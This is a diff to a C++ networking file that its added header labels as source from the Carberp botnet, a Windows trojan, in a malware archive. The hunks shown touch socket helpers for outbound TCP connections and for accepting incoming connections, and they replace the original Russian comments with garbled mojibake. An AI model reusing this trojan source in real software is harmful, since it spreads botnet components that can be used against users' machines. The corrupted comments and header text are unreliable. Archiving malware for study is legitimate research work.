@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "stdafx.h"
 
 #include <windows.h>
@@ -99,7 +110,7 @@ SOCKET WSocket::tcpConnectA(const LPSTR host, const WORD port)
 {
   WORD tcpPort = SWAP_WORD(port);
 
-  //Получаем данные удаленного сервера.
+  //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   SOCKADDR_STORAGE *destAddrIpv4 = NULL;
   SOCKADDR_STORAGE *destAddrIpv6 = NULL;
 
@@ -120,14 +131,14 @@ SOCKET WSocket::tcpConnectA(const LPSTR host, const WORD port)
 
   SOCKET s = INVALID_SOCKET;
 
-  //FIXME: поменять приоретет, когда IPv6 станет порулярнее IPv4.
+  //FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ IPv6 пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ IPv4.
   if(destAddrIpv4 != NULL)
   {
     ((SOCKADDR_IN *)destAddrIpv4)->sin_port = tcpPort;
     s = tcpConnect(destAddrIpv4);
   }
 
-  //Хз на сколько это логично в релаьных условиях.
+  //пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
   if(destAddrIpv6 != NULL && s == INVALID_SOCKET)
   {
     ((SOCKADDR_IN6 *)destAddrIpv6)->sin6_port = tcpPort;
@@ -277,7 +288,7 @@ SOCKET WSocket::tcpWaitForIncomingAndAccept(SOCKET *sockets, DWORD socketsCount,
         break;
       }
 
-      //А вдруг...
+      //пїЅ пїЅпїЅпїЅпїЅпїЅ...
       if(i == socketsCount)
       {
         CWA(ws2_32, WSASetLastError)(WSA_INVALID_HANDLE);
